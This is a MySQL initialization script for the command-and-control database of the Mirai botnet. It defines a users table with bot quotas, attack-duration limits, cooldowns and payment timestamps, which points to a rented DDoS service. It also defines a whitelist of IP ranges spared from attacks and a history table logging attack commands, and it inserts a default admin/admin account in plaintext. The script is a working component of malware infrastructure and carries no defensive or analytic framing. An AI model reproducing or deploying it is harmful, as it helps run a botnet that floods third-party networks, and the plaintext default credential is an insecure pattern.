-- Mirai C&C Database Initialization Script

CREATE DATABASE IF NOT EXISTS mirai;
USE mirai;

-- Users table
CREATE TABLE IF NOT EXISTS users (
    username VARCHAR(32) PRIMARY KEY,
    password VARCHAR(128) NOT NULL,
    max_bots INT DEFAULT -1,
    admin INT DEFAULT 0,
    last_paid INT DEFAULT 0,
    duration_limit INT DEFAULT 0,
    cooldown INT DEFAULT 0,
    wrc INT DEFAULT 0,
    intvl INT DEFAULT 30
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- Create default admin user (admin/admin)
INSERT INTO users (username, password, max_bots, admin, last_paid, duration_limit, cooldown) 
VALUES ('admin', 'admin', -1, 1, UNIX_TIMESTAMP(), 3600, 0)
ON DUPLICATE KEY UPDATE username=username;

-- Whitelist table (for protecting certain IP ranges from attacks)
CREATE TABLE IF NOT EXISTS whitelist (
    prefix VARCHAR(16),
    netmask INT
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- Add localhost to whitelist
INSERT INTO whitelist (prefix, netmask) VALUES ('127.0.0.1', 32);

-- History table (optional, for logging attacks)
CREATE TABLE IF NOT EXISTS history (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(32),
    time_sent INT,
    duration INT,
    command TEXT,
    max_bots INT,
    INDEX idx_username (username),
    INDEX idx_time (time_sent)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

FLUSH PRIVILEGES;
